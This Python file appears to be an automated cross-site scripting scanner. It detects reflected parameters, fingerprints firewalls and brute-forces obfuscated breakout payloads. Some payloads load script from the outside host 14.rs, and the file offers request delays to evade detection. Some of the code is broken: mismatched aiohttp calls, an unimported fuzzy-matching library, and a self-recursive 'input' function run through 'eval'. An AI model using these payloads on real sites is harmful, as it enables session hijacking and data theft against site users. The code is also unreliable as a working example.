#!/usr/bin/python3
# -*- coding: latin-1 -*-
from urllib.parse import (
    urlparse,
    parse_qs,
)  # library to parse urls and perform operations
import sys  # Standars system library
import webbrowser  # To open pages in "real" browers

# To iterate over multiple lists simultaneously
from urllib.parse import quote_plus  # To encode payloads
from html.parser import HTMLParser  # For parsing HTML
from time import sleep  # To pause the program for a specific time
import re  # Module for RegEx
import os  # Standard module for system related operations
import asyncio
import aiohttp
import pprint
import async_timeout
import inspect
from functools import wraps

br = aiohttp
# Just some colors and shit
white = "\033[1;97m"
green = "\033[1;32m"
red = "\033[1;31m"
yellow = "\033[1;33m"
end = "\033[1;m"
info = "\033[1;33m[!]\033[1;m"
que = "\033[1;34m[?]\033[1;m"
bad = "\033[1;31m[-]\033[1;m"
good = "\033[1;32m[+]\033[1;m"
run = "\033[1;97m[~]\033[1;m"


xsschecker = "d3v"  # A non malicious string to check for reflections and stuff
paranames = []  # list for storing parameter names
paravalues = []  # list for storing parameter values

CURRENTLY_OPEN_TAGS = []  # Used by HTML parser
OPEN_EMPTY_TAG = (
    ""  # to store context i.e. <input attr=$reflection> then input will be open tag
)

blacklist = [
    "html",
    "body",
    "br",
]  # These tags are normally empty thats why we are ignoring them
# These tags are the top priority to break out from
whitelist = ["input", "textarea"]

NUM_REFLECTIONS = 0  # Number of reflections
OCCURENCE_NUM = 0  # Occurence number
OCCURENCE_PARSED = 0  # Occurence parsed by the parser

occur_number = []
occur_location = []

delay = 0

tags = ["sVg", "iMg", "bOdY", "d3v", "deTails"]  # HTML Tags

event_handlers = {  # Event handlers and the name of tags which can be used with them
    "oNeRror": ["sVg", "iMg", "viDeo"],
    "oNloAd": ["sVg", "bOdY"],
    "oNsTart": ["maRQuee"],
    "oNMoUseOver": ["d3v", "IfRame", "bOdY"],
    "oNfoCus": ["d3v", "bOdY"],
    "oNCliCk": ["d3v", "bOdY"],
    "oNToggLe": ["deTails"],
}

functions = [  # JavaScript functions to get a popup
    "[8].find(confirm)",
    "confirm()",
    "(confirm)()",
    "co\\u006efir\\u006d()",
    "(prompt)``",
    "a=prompt,a()",
]

# "Not so malicious" payloads for fuzzing
fuzzes = [
    "<z oNxXx=yyy>",
    "<z xXx=yyy>",
    "<z o%00nload=yyy>",
    "<z oNStart=confirm()>",
    "<z oNMousEDown=(((confirm)))()>",
    "<z oNMousEDown=(prompt)``>",
    "<EmBed sRc=//14.rs>",
    "<EmBed sRc=\/\\14.rs>",
    "<z oNMoUseOver=yyy>",
    "<z oNMoUsedoWn=yyy>",
    "<z oNfoCus=yyy>",
    "<z oNsUbmit=yyy>",
    "<z oNToggLe=yyy>",
    "<z oNoRieNtATionChaNge=yyy>",
    "<z OnReaDyStateChange=yyy>",
    "<z oNbEfoReEdiTFoCus=yyy>",
    "<z oNDATAsEtChangeD=yyy>",
    "<sVG x=y>",
    "<bODy x=y>",
    "<emBed x=y>",
    "<aUdio x=y>",
    "<sCript x=y z>",
    "<iSinDEx x=y>",
    "<deTaiLs x=y>",
    "<viDeo x=y>",
    "<MaTh><x:link>",
    "x<!--y-->z",
    "<test>",
    "<script>String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 41)</script>",
    '">payload<br attr="',
    "&#x3C;script&#x3E;",
    "<r sRc=x oNError=r>",
    "<x OnCliCk=(prompt)()>click",
    "<bGsOund sRc=x>",
]

payloads = [  # Payloads for blind xss and simple bruteforcing
    "'\"</Script><Html Onmouseover=(confirm)()//" "<imG/sRc=l oNerrOr=(prompt)() x>",
    "<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
    "<deTails open oNToggle=confi\\u0072m()>",
    "<img sRc=l oNerrOr=(confirm)() x>",
    '<svg/x=">"/onload=confirm()//',
    "<svg%0Aonload=%09((pro\\u006dpt))()//",
    "<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>",
    "<sCript x>confirm``</scRipt x>",
    "<Script x>prompt()</scRiPt x>",
    "<sCriPt sRc=//14.rs>",
    "<embed//sRc=//14.rs>",
    "<base href=//14.rs/><script src=/>",
    "<object//data=//14.rs>",
    '<s=" onclick=confirm``>clickme',
    "<svG oNLoad=co\\u006efirm&#x28;1&#x29>",
    "'\"><y///oNMousEDown=((confirm))()>Click",
    "<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>",
    "<img src=x onerror=confir\\u006d`1`>",
    "<svg/onload=co\\u006efir\\u006d`1`>",
]

blind_params = [
    "redirect",
    "redir",
    "url",
    "link",
    "goto",
    "debug",
    "_debug",
    "test",
    "get",
    "index",
    "src",
    "source",
    "file",
    "frame",
    "config",
    "tst",
    "new",
    "old",
    "var",
    "rurl",
    "return_to",
    "_return",
    "returl",
    "last",
    "text",
    "load",
    "email",
    "mail",
    "user",
    "username",
    "password",
    "pass",
    "passwd",
    "first_name",
    "last_name",
    "back",
    "href",
    "ref",
    "data",
    "input",
    "out",
    "net",
    "host",
    "address",
    "code",
    "auth",
    "userid",
    "auth_token",
    "token",
    "error",
    "keyword",
    "key",
    "q",
    "query",
    "aid",
    "bid",
    "cid",
    "did",
    "eid",
    "fid",
    "gid",
    "hid",
    "iid",
    "jid",
    "kid",
    "lid",
    "mid",
    "nid",
    "oid",
    "pid",
    "qid",
    "rid",
    "sid",
    "tid",
    "uid",
    "vid",
    "wid",
    "xid",
    "yid",
    "zid",
    "cal",
    "country",
    "x",
    "y",
    "topic",
    "title",
    "head",
    "higher",
    "lower",
    "width",
    "height",
    "add",
    "result",
    "log",
    "demo",
    "example",
    "message",
]


##################
#   WAF Detector
##################

# Function to detect WAF by analysing HTTP response codes


def WAF_detector(url, param_data, GET, POST):
    global WAF
    WAF = False
    noise = quote_plus(
        "<script>confirm()</script>"
    )  # a payload which is noisy enough to provoke the WAF
    fuzz = param_data.replace(
        xsschecker, noise
    )  # Replaces xsschecker in param_data with noise
    try:
        # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
        sleep(delay)
        if GET:
            response = br.open(url + fuzz)  # Opens the noise injected payload
        else:
            response = br.open(url, fuzz)  # Opens the noise injected payload
        print("%s WAF Status: Offline" % good)
    except Exception as e:  # if an error occurs, catch the error
        e = str(e)  # convert the error to a string
        # Here, we are looking for HTTP response codes in the error to fingerprint the WAF
        if "406" in e or "501" in e:  # if the http response code is 406/501
            WAF_Name = "Mod_Security"
            WAF = True
        elif "999" in e:  # if the http response code is 999
            WAF_Name = "WebKnight"
            WAF = True
        elif "419" in e:  # if the http response code is 419
            WAF_Name = "F5 BIG IP"
            WAF = True
        elif "403" in e:  # if the http response code is 403
            WAF_Name = "Unknown"
            WAF = True
        else:
            print("%s WAF Status: Offline" % good)
        if WAF:
            print("%s WAF Detected: %s" % (bad, WAF_Name))


###################
#   Filter Checker
###################


def filter_checker(url, param_data, GET, POST):
    strength = ""  # A variable for containing strength of the filter
    # Injecting a malicious payload first by replacing xsschecker with our payload
    try:
        low_string = param_data.replace(
            xsschecker, quote_plus("<svg/onload=(confirm)()>")
        )
        # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
        sleep(delay)
        if GET:
            low_request = br.open(url + low_string).read()
        else:
            low_request = br.open(url, low_string).read()
        if (
            "<svg/onload=(confirm)()>" in low_request
        ):  # If payload was reflected in response
            print("%s Filter Strength : %sLow or None%s" % (good, green, end))
            print("%s Payload: <svg/onload=(confirm)()>" % good)
            print("%s Efficiency: 100%%" % good)
            choice = input(
                "%s A payload with 100%% efficiency was found. Continue scanning? [y/N] "
                % que
            ).lower()
            if choice == "y":
                pass
            else:
                if GET:
                    webbrowser.open(
                        url + param_data.strip(xsschecker) +
                        "<svg/onload=(confirm)()>"
                    )
                    quit()
            strength = (
                "low"  # As a malicious payload was not filtered, the filter is weak
            )
        else:  # If malicious payload was filtered (was not in the response)
            # Now we will use a less malicious payload
            medium_string = param_data.replace(
                xsschecker, quote_plus("<zz//onxx=yy>"))
            sleep(
                delay
            )  # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
            if GET:
                medium_request = br.open(url + medium_string).read()
            else:
                medium_request = br.open(url + medium_string).read()
            if "<zz onxx=yy>" in medium_request:
                print("%s Filter Strength : %sMedium%s" % (info, yellow, end))
                strength = "medium"
            else:  # Printing high since result was not medium/low
                print("%s Filter Strength : %sHigh%s" % (bad, red, end))
                strength = "high"
            return strength
    except Exception as e:
        try:
            print(
                "%s Target doesn't seem to respond properly. Error Code: %s"
                % (bad, re.search(r"\d\d\d", str(e)).group())
            )
        except:
            print("%s Target doesn't seem to respond properly." % bad)


##################
#   Locater
##################


def locater(url, param_data, GET, POST):
    # Makes request to the target
    init_resp = make_request(url, param_data, GET, POST)
    if xsschecker in init_resp.lower():  # if the xsschecker is found in the response
        global NUM_REFLECTIONS  # The number of reflections of xsschecker in the response
        NUM_REFLECTIONS = init_resp.lower().count(
            xsschecker.lower()
        )  # Counts number of time d3v got reflected in webpage
        print("%s Number of reflections found: %i" % (info, NUM_REFLECTIONS))
        for i in range(NUM_REFLECTIONS):
            global OCCURENCE_NUM
            OCCURENCE_NUM = i + 1
            scan_occurence(
                init_resp
            )  # Calls out a function to find context/location of xsschecker
            # Reset globals for next instance
            global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
            ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
            (
                IN_SINGLE_QUOTES,
                IN_DOUBLE_QUOTES,
                IN_TAG_ATTRIBUTE,
                IN_TAG_NON_ATTRIBUTE,
                IN_SCRIPT_TAG,
            ) = (False, False, False, False, False)
            OCCURENCE_PARSED = 0
            OPEN_EMPTY_TAG = ""
    else:  # Launched hulk if no reflection is found. Hulk Smash!
        print("%s No reflection found." % bad)


def scan_occurence(init_resp):
    # Parses the response to locate the position/context of xsschecker i.e. d3v
    location = html_parse(init_resp)  # Calling out the parser function
    if location in ("script", "html_data", "start_end_tag_attr", "attr"):
        occur_number.append(OCCURENCE_NUM)
        occur_location.append(location)
    # We are treating the comment context differentally because if a payload is reflected
    # in comment, it won't execute. So will we test the comment context first
    elif location == "comment":
        occur_number.insert(
            0, OCCURENCE_NUM
        )  # inserting the occurence_num in start of the list
        occur_location.insert(0, location)  # same as above
    else:
        pass


def html_parse(init_resp):
    parser = MyHTMLParser()  # initializes the parser
    location = ""  # Variable for containing the location lol
    try:
        parser.feed(init_resp)  # submitting the response to the parser
    except Exception as e:  # Catching the exception/error
        location = str(
            e
        )  # The error is actually the location. For more info, check MyHTMLParser class
    return location  # Returns the location


def test_param_check(
    payload_to_check,
    payload_to_compare,
    OCCURENCE_NUM,
    url,
    param_data,
    GET,
    POST,
    action,
):
    check_string = (
        "XSSSTART" + payload_to_check + "XSSEND"
    )  # We are adding XSSSTART and XSSEND to make
    compare_string = (
        "XSSSTART" + payload_to_compare + "XSSEND"
    )  # the payload distinguishable in the response
    param_data_injected = param_data.replace(xsschecker, check_string)
    try:
        check_response = make_request(url, param_data_injected, GET, POST)
    except:
        check_response = ""
    success = False
    occurence_counter = (
        0  # Variable to keep track of which reflection is going through the loop
    )
    # Itretating over the reflections
    for m in re.finditer("XSSSTART", check_response, re.IGNORECASE):
        occurence_counter = occurence_counter + 1
        efficiency = fuzz.partial_ratio(
            check_response[m.start(): m.start() + len(compare_string)].lower(),
            compare_string.lower(),
        )
        if efficiency == 100:
            if action == "do":
                print("\n%s Payload: %s" % (good, payload_to_compare))
                print("%s Efficiency: 100%%" % good)
                choice = input(
                    "%s A payload with 100%% efficiency was found. Continue scanning? [y/N] "
                    % que
                ).lower()
                if choice == "y":
                    pass
                else:
                    if GET:
                        webbrowser.open(
                            url + param_data.strip(xsschecker) +
                            payload_to_compare
                        )
                        quit()
            if occurence_counter == OCCURENCE_NUM:
                success = True
            break

        if efficiency > 90:
            if action == "do":
                print("\n%s Payload: %s" % (good, payload_to_compare))
                print("%s Efficiency: %s" % (good, efficiency))
                try:
                    data_type = occur_location[OCCURENCE_NUM - 1]
                    if data_type == "comment":
                        location_readable = "inside a HTML comment "
                    elif data_type == "html_data":
                        location_readable = "as data or plaintext on the page"
                    elif data_type == "script":
                        location_readable = "as data in javascript"
                    elif data_type == "start_end_tag_attr":
                        location_readable = "as an attribute in an empty tag"
                    elif data_type == "attr":
                        location_readable = "as an attribute in an HTML tag"
                    print("%s Location: %s" % (good, location_readable))
                    break
                except:
                    continue
    return success


def make_request(
    url, param_data, GET, POST
):  # The main function which actually makes contact with the target
    # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
    sleep(delay)
    try:
        if GET:
            resp = br.open(url + param_data)  # Makes request
            return resp.read()  # Reads the output
        elif POST:
            resp = br.open(url, param_data)  # Makes request
            return resp.read()  # Reads the output
    except:
        print("\n%s Target isn't responding." % bad)
        quit()


class MyHTMLParser(HTMLParser):
    def handle_comment(self, data):
        global OCCURENCE_PARSED
        if xsschecker.lower() in data.lower():
            OCCURENCE_PARSED += 1
            if OCCURENCE_PARSED == OCCURENCE_NUM:
                raise Exception("comment")

    def handle_startendtag(self, tag, attrs):
        global OCCURENCE_PARSED
        global OCCURENCE_NUM
        global OPEN_EMPTY_TAG
        if xsschecker.lower() in str(attrs).lower():
            OCCURENCE_PARSED += 1
            if OCCURENCE_PARSED == OCCURENCE_NUM:
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")

    def handle_starttag(self, tag, attrs):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if tag not in blacklist:
            CURRENTLY_OPEN_TAGS.append(tag)
        if xsschecker.lower() in str(attrs).lower():
            if tag == "script":
                OCCURENCE_PARSED += 1
                if OCCURENCE_PARSED == OCCURENCE_NUM:
                    raise Exception("script")
            else:
                OCCURENCE_PARSED += 1
                if OCCURENCE_PARSED == OCCURENCE_NUM:
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if tag not in blacklist:
            CURRENTLY_OPEN_TAGS.remove(tag)

    def handle_data(self, data):
        global OCCURENCE_PARSED
        if xsschecker.lower() in data.lower():
            OCCURENCE_PARSED += 1
            if OCCURENCE_PARSED == OCCURENCE_NUM:
                try:
                    if CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] == "script":
                        raise Exception("script")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")


#################
#   Which Quote
#################


def which_quote(OCCURENCE_NUM, url, param_data, GET, POST):
    check_string = "XSSSTART" + "d3v" + "XSSEND"
    compare_string = "XSSSTART" + "d3v" + "XSSEND"
    param_data_injected = param_data.replace(xsschecker, check_string)
    try:
        check_response = make_request(url, param_data_injected, GET, POST)
    except:
        check_response = ""
    quote = ""
    occurence_counter = 0
    for m in re.finditer("XSSSTART", check_response, re.IGNORECASE):
        occurence_counter += 1
        if occurence_counter == OCCURENCE_NUM and (
            check_response[(m.start() - 1): m.start()] == "'"
            or check_response[(m.start() - 1): m.start()] == '"'
        ):
            return check_response[(m.start() - 1): m.start()]
        elif occurence_counter == OCCURENCE_NUM:
            return quote


################
#   ParamFinder
################


def paramfinder(url, GET, POST):
    response = br.open(url).read()
    matches = re.findall(
        r'<input[^<]*name=\'[^<]*\'*>|<input[^<]*name="[^<]*"*>', response
    )
    for match in matches:
        try:
            found_param = (
                match.encode("utf-8")
                .split("name=")[1]
                .split(" ")[0]
                .replace("'", "")
                .replace('"', "")
            )
        except UnicodeDecodeError:
            continue
        print(
            "%s Heuristics found a potentially valid parameter: %s%s%s. Priortizing it."
            % (good, green, found_param, end)
        )
        blind_params.insert(0, found_param)
    progress = 0
    for param in blind_params:
        progress = progress + 1
        sys.stdout.write(
            "\r%s Parameters checked: %i/%i" % (run,
                                                progress, len(blind_params))
        )
        sys.stdout.flush()
        if param not in paranames:
            if GET:
                response = br.open(url + "?" + param + "=" + xsschecker).read()
            if POST:
                response = br.open(url, param + "=" + xsschecker).read()
            if (
                "'%s'" % xsschecker in response
                or '"%s"' % xsschecker in response
                or " %s " % xsschecker in response
            ):
                print("%s Valid parameter found : %s%s%s" %
                      (good, green, param, end))
                paranames.append(param)
                paravalues.append("")


################
#   Injector
################


def inject(url, param_data, GET, POST):
    special = ""
    l_filling = ""
    e_fillings = [
        "%0a",
        "%09",
        "%0d",
        "+",
    ]  # "Things" to use between event handler and = or between function and =
    # "Things" to use instead of space
    fillings = ["%0c", "%0a", "%09", "%0d", "/+/"]

    for OCCURENCE_NUM, location in zip(occur_number, occur_location):
        print("\n%s Testing reflection no. %s " % (run, OCCURENCE_NUM))
        allowed = []

        if test_param_check(
            'k"k', 'k"k', OCCURENCE_NUM, url, param_data, GET, POST, action="nope"
        ):
            print('%s Double Quotes (") are allowed.' % good)
            double_allowed = True
            allowed.append('"')
        elif test_param_check(
            'k"k', "k&quot;k", OCCURENCE_NUM, url, param_data, GET, POST, action="nope"
        ):
            print('%s Double Quotes (") are not allowed.' % bad)
            print('%s HTML Encoding detected i.e " --> &quot;' % bad)
            HTML_encoding = True
        else:
            print('%s Double Quotes (") are not allowed.' % bad)
            double_allowed = False

        if test_param_check(
            "k'k", "k'k", OCCURENCE_NUM, url, param_data, GET, POST, action="nope"
        ):
            print("%s Single Quotes (') are allowed." % good)
            single_allowed = True
            allowed.append("'")
        else:
            single_allowed = False
            print("%s Single Quotes (') are not allowed." % bad)

        if test_param_check(
            "<lol>", "<lol>", OCCURENCE_NUM, url, param_data, GET, POST, action="nope"
        ):
            print("%s Angular Brackets (<>) are allowed." % good)
            angular_allowed = True
            allowed.extend(("<", ">"))
        else:
            angular_allowed = False
            print("%s Angular Brackets (<>) are not allowed." % bad)

        # if test_param_check('k&gt;k', 'k&gt;k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope') or test_param_check('&gt;', '>', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'):
        #     entity_allowed = True
        #     allowed.append('entity')
        #     print '%s HTML Entities are allowed.' % good
        # else:
        #     entity_allowed = False
        #     print '%s HTML Entities are  not allowed.' % bad

        if location == "comment":
            print(
                "%s Trying to break out of %sHTML Comment%s context."
                % (run, green, end)
            )
            prefix = "-->"
            suffixes = ["", "<!--"]
            progress = 1
            for suffix in suffixes:
                for tag in tags:
                    for event_handler, compatible in list(event_handlers.items()):
                        if tag in compatible:
                            for filling, function, e_filling in zip(
                                fillings, functions, e_fillings
                            ):
                                progress = progress + 1
                                sys.stdout.write(
                                    "\r%s Payloads tried: %i" % (run, progress)
                                )
                                sys.stdout.flush()
                                if event_handler == "oNeRror":
                                    payload = "%s<%s%s%s%s%s%s%s%s=%s%s%s>%s" % (
                                        prefix,
                                        tag,
                                        filling,
                                        "sRc=",
                                        e_filling,
                                        "=",
                                        e_filling,
                                        event_handler,
                                        e_filling,
                                        e_filling,
                                        function,
                                        l_filling,
                                        suffix,
                                    )
                                else:
                                    payload = "%s<%s%s%s%s%s=%s%s%s>%s" % (
                                        prefix,
                                        tag,
                                        filling,
                                        special,
                                        event_handler,
                                        e_filling,
                                        e_filling,
                                        function,
                                        l_filling,
                                        suffix,
                                    )
                                test_param_check(
                                    quote_plus(payload),
                                    payload,
                                    OCCURENCE_NUM,
                                    url,
                                    param_data,
                                    GET,
                                    POST,
                                    action="do",
                                )

        elif location == "script":
            print(
                "%s Trying to break out of %sJavaScript%s context." % (
                    run, green, end)
            )
            prefixes = ["'-", "\\'-", "\\'-"]
            suffixes = ["-'", "-\\'", "//'"]
            progress = 0
            for prefix, suffix in zip(prefixes, suffixes):
                for function in functions:
                    progress = progress + 1
                    sys.stdout.write("\r%s Payloads tried: %i" %
                                     (run, progress))
                    sys.stdout.flush()
                    payload = prefix + function + suffix
                    test_param_check(
                        quote_plus(payload),
                        payload,
                        OCCURENCE_NUM,
                        url,
                        param_data,
                        GET,
                        POST,
                        action="do",
                    )
            test_param_check(
                quote_plus("</script><svg onload=prompt()>"),
                "</script><svg onload=prompt()>",
                OCCURENCE_NUM,
                url,
                param_data,
                GET,
                POST,
                action="do",
            )

        elif location == "html_data":
            print(
                "%s Trying to break out of %sPlaintext%s context." % (
                    run, green, end)
            )
            progress = 0
            l_than, g_than = "", ""
            if angular_allowed:
                l_than, g_than = "<", ">"
            # elif entity_allowed:
            #     l_than, g_than = '&lt;', '&gt;'
            else:
                print(
                    "%s Angular brackets are being filtered. Unable to generate payloads."
                    % bad
                )
                continue
            for tag in tags:
                for event_handler, compatible in list(event_handlers.items()):
                    if tag in compatible:
                        for filling, function, e_filling in zip(
                            fillings, functions, e_fillings
                        ):
                            progress = progress + 1
                            sys.stdout.write(
                                "\r%s Payloads tried: %i" % (run, progress)
                            )
                            sys.stdout.flush()
                            if event_handler == "oNeRror":
                                payload = "%s%s%s%s%s%s%s%s%s=%s%s%s%s" % (
                                    l_than,
                                    tag,
                                    filling,
                                    "sRc=",
                                    e_filling,
                                    "=",
                                    e_filling,
                                    event_handler,
                                    e_filling,
                                    e_filling,
                                    function,
                                    l_filling,
                                    g_than,
                                )
                            else:
                                payload = "%s%s%s%s%s%s=%s%s%s%s" % (
                                    l_than,
                                    tag,
                                    filling,
                                    special,
                                    event_handler,
                                    e_filling,
                                    e_filling,
                                    function,
                                    l_filling,
                                    g_than,
                                )
                            test_param_check(
                                quote_plus(payload),
                                payload,
                                OCCURENCE_NUM,
                                url,
                                param_data,
                                GET,
                                POST,
                                action="do",
                            )

        elif location == "start_end_tag_attr" or location == "attr":
            print(
                "%s Trying to break out of %sAttribute%s context." % (
                    run, green, end)
            )
            quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)

            if quote == "":
                prefix = "/>"
                suffixes = ['<"', "<'", "<br attr'=", '<br attr="']

            elif quote in allowed:
                prefix = "%s>" % quote
                suffixes = ["<%s" % quote, "<br attr=%s" % quote]
                progress = 0
                for suffix in suffixes:
                    for tag in tags:
                        for event_handler, compatible in list(event_handlers.items()):
                            if tag in compatible:
                                for filling, function, e_filling in zip(
                                    fillings, functions, e_fillings
                                ):
                                    progress = progress + 1
                                    sys.stdout.write(
                                        "\r%s Payloads tried: %i" % (
                                            run, progress)
                                    )
                                    sys.stdout.flush()
                                    if event_handler == "oNeRror":
                                        payload = "%s<%s%s%s%s%s%s%s%s=%s%s%s>%s" % (
                                            prefix,
                                            tag,
                                            filling,
                                            "sRc=",
                                            e_filling,
                                            "=",
                                            e_filling,
                                            event_handler,
                                            e_filling,
                                            e_filling,
                                            function,
                                            l_filling,
                                            suffix,
                                        )
                                    else:
                                        payload = "%s<%s%s%s%s%s=%s%s%s>%s" % (
                                            prefix,
                                            tag,
                                            filling,
                                            special,
                                            event_handler,
                                            e_filling,
                                            e_filling,
                                            function,
                                            l_filling,
                                            suffix,
                                        )
                                    test_param_check(
                                        quote_plus(payload),
                                        payload,
                                        OCCURENCE_NUM,
                                        url,
                                        param_data,
                                        GET,
                                        POST,
                                        action="do",
                                    )

            elif quote not in allowed and "entity" in allowed:
                prefix = ""
                # if quote == '\'':
                #     prefix = ['&apos;', '&apos;']
                #     suffixes = ['&lt;&apos;', '&lt; attr=&apos;']
                # elif quote == '"':
                #     prefix = ['&quot;', '&quot;']
                #     suffixes = ['&lt;&quot;', '&lt;br attr=&quot;']
                # for suffix in suffixes:
                #     progress = 0
                #     for tag in tags:
                #         for event_handler, compatible in event_handlers.items():
                #             if tag in compatible:
                #                 for filling, function, e_filling in izip(fillings, functions, e_fillings):
                #                     progress = progress + 1
                #                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                #                     sys.stdout.flush()
                #                     if event_handler == 'oNeRror':
                #                         payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
                #                     else:
                #                         payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                #                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
            else:
                print(
                    "%s Quotes are being filtered, its not possible to break out of the context."
                    % bad
                )


###################
#   Param Parser
###################


def param_parser(target, param_data, GET, POST):
    global url
    if POST:
        target = target + "?" + param_data
    parsed_url = urlparse(target)
    url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
    parameters = parse_qs(parsed_url.query, keep_blank_values=True)
    for para in parameters:
        for i in parameters[para]:
            paranames.append(para)
            paravalues.append(i)


##################
#   Initiator
##################


def initiator(url, GET, POST):
    choice = input(
        "%s Would you like to look for hidden parameters? [y/N] " % que)
    if choice == "y":
        paramfinder(url, GET, POST)
    if len(paranames) == 0:
        print("%s No parameters to test." % bad)
        quit()
    else:
        if GET:
            GET, POST = True, False
            WAF_detector(url, "?" + paranames[0] + "=" + xsschecker, GET, POST)
            current_param = 0
            for param_name in paranames:
                print(("%s-%s" % (red, end)) * 50)
                print("%s Testing parameter %s%s%s" %
                      (run, green, param_name, end))

                paranames_combined = []
                for param_name, param_value in zip(paranames, paravalues):
                    paranames_combined.append(
                        "&" + param_name + "=" + param_value)

                new_param_data = []
                current = "&" + paranames[current_param] + "="
                for i in paranames_combined:
                    if current in i:
                        pass
                    else:
                        new_param_data.append(i)

                param_data = (
                    "?"
                    + paranames[current_param]
                    + "="
                    + xsschecker
                    + "".join(new_param_data)
                )
                if WAF:
                    choice = input(
                        "%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] "
                        % que
                    )
                    if choice == "y":
                        delay = 6
                    else:
                        delay = 0
                    quit()
                # Launces filter checker
                filter_checker(url, param_data, GET, POST)
                locater(url, param_data, GET, POST)  # Launcher locater
                inject(url, param_data, GET, POST)  # Launches injector
                del occur_number[:]
                del occur_location[:]
                current_param = current_param + 1

        elif POST:
            GET, POST = False, True
            WAF_detector(url, "?" + paranames[0] + "=" + xsschecker, GET, POST)
            current_param = 0
            for param_name in paranames:
                print(("%s-%s" % (red, end)) * 50)
                print("%s Testing parameter %s%s%s" %
                      (run, green, param_name, end))
                paranames_combined = []
                new_param_data = []
                for param_name, param_value in zip(paranames, paravalues):
                    paranames_combined.append(
                        "&" + param_name + "=" + param_value)
                current = "&" + paranames[current_param] + "="
                for i in paranames_combined:
                    if current in i:
                        pass
                    else:
                        new_param_data.append(i)
                param_data = (
                    paranames[current_param]
                    + "="
                    + xsschecker
                    + "".join(new_param_data)
                )
                if WAF:
                    choice = input(
                        "%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] "
                        % que
                    )
                    if choice == "y":
                        delay = 6
                    else:
                        delay = 0
                    # Launches fuzzer aka Ninja
                    quit()
                # Launches filter checker
                filter_checker(url, param_data, GET, POST)
                locater(url, param_data, GET, POST)  # Launches locater
                inject(url, param_data, GET, POST)  # Launches injector
                del occur_number[:]  # Clears the occur_number list
                del occur_location[:]  # Clears the occur_location list
                current_param = current_param + 1

    if len(occur_number) == 0 and GET:
        print("%s Executing project HULK for blind XSS Detection" % info)
        for payload in payloads:
            param_data = param_data.replace(
                xsschecker, payload
            )  # Replaces the xsschecker with payload
            print("%s Payload: %s" % (info, payload))
            # Opens the "injected" URL in browser
            webbrowser.open(url + param_data)
            next = input("%s Press enter to execute next payload" % que)

    elif len(occur_number) == 0 and POST:
        choice = input(
            "%s Would you like to generate some payloads for blind XSS? [Y/n] " % que
        ).lower()
        if choice == "n":
            quit()
        else:
            for (
                payload
            ) in payloads:  # We will print the payloads from the payloads list
                print("%s  %s" % (info, payload))


##############
#   Input
##############


def input():
    target = input("%s Enter a url: " % que)

    if "http" in target:  # if the target has http in it, do nothing
        pass
    else:
        try:
            br.open(
                "http://%s" % target
            )  # Makes request to the target with http schema
            target = "http://%s" % target
        except:  # if it fails, maybe the target uses https schema
            target = "https://%s" % target

    try:
        br.open(target)  # Makes request to the target
    except Exception as e:  # if it fails, the target is unreachable
        if "ssl" in str(e).lower():
            print("%s Unable to verify target's SSL certificate." % bad)
            quit()
        else:
            print("%s Unable to connect to the target." % bad)
            quit()

    cookie = input("%s Enter cookie (if any): " % que)
    if cookie != "":
        br.addheaders.append(("Cookie", cookie))

    if "=" in target:  # A url with GET request must have a = so...
        GET, POST = True, False
        param_data = ""
        param_parser(target, param_data, GET, POST)
        initiator(url, GET, POST)
    else:
        choice = input("%s Does it use POST method? [Y/n] " % que).lower()
        if choice == "n":
            GET, POST = True, False
            initiator(target, GET, POST)
        else:
            GET, POST = False, True
            param_data = input("%s Enter POST data: " % que)
            param_parser(target, param_data, GET, POST)
            initiator(url, GET, POST)


eval(input())  # This is the true start of the program
